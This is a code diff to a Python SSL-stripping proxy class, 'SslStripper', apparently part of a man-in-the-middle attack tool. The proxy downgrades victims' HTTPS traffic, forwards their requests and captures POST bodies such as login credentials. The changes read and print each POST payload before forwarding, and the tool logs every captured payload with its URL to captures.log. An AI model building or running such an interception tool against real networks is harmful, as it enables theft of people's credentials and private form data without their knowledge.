@@ -8,6 +8,7 @@ from urllib.parse import urlparse
 import requests
 from termcolor import colored
 
+
 class SslStripper:
     def __init__(self, port=80, logging=True):
         self.port = port
@@ -26,11 +27,18 @@ class SslStripper:
                 host = self.headers.get("Host")
 
                 if "localhost" in host.lower():
-                    raise self.BadRequestException("Invalid host")
+                    return  # Ignore requests to localhost
 
                 path = urlparse(self.path).path
 
                 print(colored(f"[SSL] Forwarding request to https://{host}{path}...", "light_grey"))
+
+                # Print payload to if POST request
+                if method == "POST":
+                    content_length = int(self.headers.get("Content-Length", 0))
+                    payload = self.rfile.read(content_length)
+
+                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
 
                 # Forward request to specified host
                 try:
@@ -45,10 +53,6 @@ class SslStripper:
                     with open("captures.log", "a") as f:  # Log payload to file
                         timestamp = datetime.now().strftime("%d-%m-%Y %H:%M:%S")
                         f.write(f"[{timestamp}] http://{host}{path}: {payload}\n")  # Write capture as line
-
-                # Print payload to if POST request
-                if method == "POST":
-                    print(colored(f"[SSL] Captured POST payload: {payload}", "light_grey"))
 
                 # Return response with payload to client
                 self.send_response(response.status_code)
